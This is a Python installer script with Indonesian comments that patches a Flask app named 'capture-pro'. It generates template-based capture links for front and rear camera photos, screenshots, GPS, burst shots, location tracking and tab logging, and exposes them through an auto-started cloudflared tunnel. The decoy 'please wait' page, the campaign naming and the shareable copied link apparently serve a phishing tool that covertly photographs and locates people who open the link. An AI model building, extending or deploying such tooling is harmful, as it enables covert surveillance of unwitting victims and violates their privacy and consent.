"""
Installer: Auto-Start Tunnel + Tunnel URL di Template Link
Jalankan: python setup_auto_tunnel.py
"""
import os
from pathlib import Path

PROJECT = Path.home() / "capture-pro"

if not PROJECT.exists():
    print(f"❌ Folder {PROJECT} tidak ada.")
    exit(1)


# ============================================================
# 1. Patch templates_gallery.py — auto-start tunnel + tunnel URL
# ============================================================
print("[1/3] Patch templates_gallery.py...")

tpl_file = PROJECT / "app" / "routes" / "templates_gallery.py"
content = tpl_file.read_text(encoding="utf-8")

# Backup
backup = tpl_file.with_suffix(".py.bak_tunnel")
backup.write_text(content, encoding="utf-8")

# Cari fungsi use_template dan replace seluruhnya
import re

new_use_template = '''def _get_tunnel_url():
    """Cek URL tunnel aktif. Kalau belum ada, coba start."""
    import subprocess
    script = os.path.expanduser("~/capture-pro/tunnel_service.sh")
    if not os.path.isfile(script):
        return None, False

    try:
        # Cek status
        result = subprocess.run(
            ["bash", script, "status"],
            capture_output=True, text=True, timeout=10,
        )
        out = (result.stdout or "").strip()
        parts = out.split("|")
        running = (parts[0].strip() == "RUNNING") if parts else False
        url = parts[2].strip() if len(parts) > 2 else ""

        if running and url:
            return url, False  # Sudah jalan

        # Belum jalan → start
        result = subprocess.run(
            ["bash", script, "start"],
            capture_output=True, text=True, timeout=45,
        )
        out = (result.stdout or "") + (result.stderr or "")

        # Extract URL dari output
        m = re.search(r"https://[a-z0-9-]+\\.trycloudflare\\.com", out)
        if m:
            return m.group(0), True

        # Kalau tidak ada di output, cek log
        import time
        time.sleep(3)
        result = subprocess.run(
            ["bash", script, "url"],
            capture_output=True, text=True, timeout=10,
        )
        url = (result.stdout or "").strip()
        if url.startswith("https://"):
            return url, True

        return None, True  # Started tapi URL belum siap
    except Exception as e:
        print(f"[tunnel] error: {e}")
        return None, False


@bp.route("/api/templates/use/<int:tid>", methods=["POST"])
@login_required
def use_template(tid):
    """Bikin CaptureConfig dari template + auto-start tunnel."""
    from flask import jsonify, request as _r
    import re as _re

    try:
        t = Template.query.get(tid)
        if not t:
            return jsonify({"ok": False, "msg": "Template not found"}), 404

        # Parse config
        try:
            cfg = json.loads(t.config_json or "{}")
        except Exception:
            cfg = {}

        data = _r.get_json(force=True, silent=True) or {}
        campaign = (data.get("campaign") or t.category or "template")[:64]

        # Generate slug unik
        alphabet = string.ascii_lowercase + string.digits
        slug = None
        for _ in range(20):
            candidate = "".join(secrets.choice(alphabet) for _ in range(8))
            if not CaptureConfig.query.filter_by(slug=candidate).first():
                slug = candidate
                break
        if not slug:
            return jsonify({"ok": False, "msg": "Slug collision"}), 500

        # Bikin CaptureConfig
        c = CaptureConfig(
            slug=slug,
            name=(data.get("name") or t.name)[:128],
            campaign=campaign,
            foto_depan=1 if cfg.get("foto_depan") else 0,
            foto_belakang=1 if cfg.get("foto_belakang") else 0,
            screenshot=1 if cfg.get("screenshot") else 0,
            gps=1 if cfg.get("gps") else 0,
            burst=1 if cfg.get("burst") else 0,
            burst_interval=int(cfg.get("burst_interval") or 3),
            burst_duration=int(cfg.get("burst_duration") or 30),
            location_tracking=1 if cfg.get("location_tracking") else 0,
            tab_log=1 if cfg.get("tab_log") else 0,
            delay_seconds=int(cfg.get("delay_seconds") or 5),
            wait_permission=1,
            title=t.name[:128],
            subtitle=(t.description or "Mohon tunggu sebentar...")[:500],
        )
        try:
            c.template_id = t.id
        except Exception:
            pass

        db.session.add(c)
        db.session.commit()

        # === AUTO-START TUNNEL ===
        tunnel_url, was_started = _get_tunnel_url()

        # Base URL: pakai tunnel kalau ada, fallback ke request.host
        if tunnel_url:
            base_url = tunnel_url.rstrip("/")
        else:
            base_url = _r.host_url.rstrip("/")

        link_tpl = f"{base_url}/t/{t.id}/{slug}"
        link_short = f"{base_url}/m/{slug}"

        return jsonify({
            "ok": True,
            "slug": slug,
            "template_id": t.id,
            "tunnel_url": tunnel_url,
            "tunnel_started": was_started,
            "link_template": link_tpl,
            "link_short": link_short,
            "using_tunnel": bool(tunnel_url),
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({"ok": False, "msg": "Server error: " + str(e)}), 500


'''

# Replace use_template lama
pattern = r'@bp\.route\("/api/templates/use/<int:tid>".*?(?=\n@bp\.route|\n@login_required|\n\ndef |\Z)'
if re.search(pattern, content, re.DOTALL):
    content = re.sub(pattern, new_use_template + "\n", content, count=1, flags=re.DOTALL)
    tpl_file.write_text(content, encoding="utf-8")
    print("      OK  use_template di-patch dengan auto-tunnel")
else:
    print("      WARN — pattern tidak match, cek manual")


# ============================================================
# 2. Patch templates_gallery.html — tampilkan tunnel URL
# ============================================================
print("\n[2/3] Patch templates_gallery.html...")

html_file = PROJECT / "app" / "templates" / "templates_gallery.html"
html = html_file.read_text(encoding="utf-8")
backup = html_file.with_suffix(".html.bak_tunnel")
backup.write_text(html, encoding="utf-8")

# Ganti fungsi useTemplate
new_use_fn = '''function useTemplate(id) {
  var name = prompt('Nama mode untuk template ini:', 'Template Mode ' + id);
  if (name === null) return;

  // Show loading overlay
  var loading = document.createElement('div');
  loading.id = 'loadingOverlay';
  loading.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.85);color:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:99999;font-family:system-ui';
  loading.innerHTML = '<div style="font-size:50px;margin-bottom:16px">&#9203;</div>' +
                      '<div style="font-size:16px">Membuat link + start tunnel...</div>' +
                      '<div style="font-size:13px;color:#8b949e;margin-top:10px">Tunggu 10-30 detik (start cloudflared)</div>';
  document.body.appendChild(loading);

  fetch('/api/templates/use/' + id, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: name || ('Template ' + id) }),
  })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      var overlay = document.getElementById('loadingOverlay');
      if (overlay) overlay.remove();

      if (!data.ok) throw new Error(data.msg || 'Gagal');

      var tunnelUrl = data.tunnel_url;
      var linkTpl = data.link_template;
      var linkShort = data.link_short;
      var usingTunnel = data.using_tunnel;

      var statusMsg = '';
      if (usingTunnel) {
        statusMsg = '<p style="color:#2ea043;font-weight:600">&#10004; Tunnel aktif</p>';
      } else {
        statusMsg = '<p style="color:#d29922">&#9888; Tunnel belum siap — link pakai localhost. Coba start tunnel dulu di dashboard.</p>';
      }

      var html = '<div style="text-align:left;font-size:13px;line-height:1.6">' +
        statusMsg +
        '<p style="margin:12px 0 6px"><b>Link template:</b></p>' +
        '<input id="lk1" value="' + linkTpl + '" readonly style="width:100%;padding:10px;background:#0d1117;color:#58a6ff;border:1px solid #30363d;border-radius:6px;font-size:11px;box-sizing:border-box">' +
        '<button onclick="copyInput(\\'lk1\\')" style="margin-top:6px;padding:8px 16px;background:#1e6feb;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">&#128203; Copy Link</button>' +
        '<p style="margin:14px 0 6px"><b>Link mode saja:</b></p>' +
        '<input id="lk2" value="' + linkShort + '" readonly style="width:100%;padding:10px;background:#0d1117;color:#58a6ff;border:1px solid #30363d;border-radius:6px;font-size:11px;box-sizing:border-box">' +
        '<button onclick="copyInput(\\'lk2\\')" style="margin-top:6px;padding:8px 16px;background:#30363d;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">&#128203; Copy</button>' +
        '<p style="margin:14px 0 0;color:#8b949e;font-size:11px">Buka link untuk test. Kalau halaman muncul &amp; minta izin kamera, berarti berhasil.</p>' +
        '</div>';

      // Alert box dengan info
      var modal = document.createElement('div');
      modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.85);color:#e6edf3;display:flex;align-items:center;justify-content:center;z-index:99999;font-family:system-ui;padding:20px';
      modal.innerHTML = '<div style="background:#161b22;border:1px solid #30363d;border-radius:12px;max-width:520px;width:100%;padding:20px">' +
        '<h2 style="margin:0 0 12px;color:#58a6ff;font-size:18px">&#127881; Link Dibuat!</h2>' +
        html +
        '<button onclick="this.closest(\\'div[style*=\"position:fixed\"]\\').remove()" style="margin-top:16px;width:100%;padding:12px;background:#1e6feb;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600">Tutup</button>' +
        '</div>';
      document.body.appendChild(modal);
    })
    .catch(function(e) {
      var overlay = document.getElementById('loadingOverlay');
      if (overlay) overlay.remove();
      alert('Error: ' + e.message);
    });
}

function copyInput(id) {
  var el = document.getElementById(id);
  if (!el) return;
  el.select();
  try {
    navigator.clipboard.writeText(el.value);
    alert('Link dicopy!');
  } catch (e) {
    document.execCommand('copy');
    alert('Link dicopy!');
  }
}
'''

# Replace fungsi useTemplate lama
pattern = r'function useTemplate\(id\) \{.*?\n\}'
if re.search(pattern, html, re.DOTALL):
    html = re.sub(pattern, new_use_fn, html, count=1, flags=re.DOTALL)
    html_file.write_text(html, encoding="utf-8")
    print("      OK  useTemplate di-patch (tampilkan tunnel URL)")
else:
    print("      WARN — pattern useTemplate tidak match")


# ============================================================
# 3. Verify
# ============================================================
print("\n[3/3] Verify...")

# Cek apakah tunnel_service.sh ada
script = PROJECT / "tunnel_service.sh"
print(f"      tunnel_service.sh: {'✅ ADA' if script.exists() else '❌ TIDAK ADA'}")

# Cek blueprint
init = PROJECT / "app" / "__init__.py"
init_content = init.read_text(encoding="utf-8")
has_exempt = "csrf.exempt(tpl_gallery_mod.bp)" in init_content
print(f"      csrf.exempt tpl_gallery: {'✅ ADA' if has_exempt else '❌ TIDAK ADA'}")

print()
print("=" * 60)
print("  ✅ INSTALL BERHASIL")
print("=" * 60)
print()
print("  Yang berubah:")
print("    - use_template() sekarang auto-start tunnel")
print("    - Link yang muncul pakai URL tunnel (bukan localhost)")
print("    - Modal cantik dengan tombol Copy")
print()
print("  Restart server:")
print("    pkill -f 'python run.py'")
print("    cd ~/capture-pro && python run.py")
print()
print("  Lalu test:")
print("    1. Buka /templates")
print("    2. Klik '🚀 Pakai' di template")
print("    3. Tunggu 10-30 detik (start tunnel)")
print("    4. Link muncul dengan URL https://xxx.trycloudflare.com")
print()
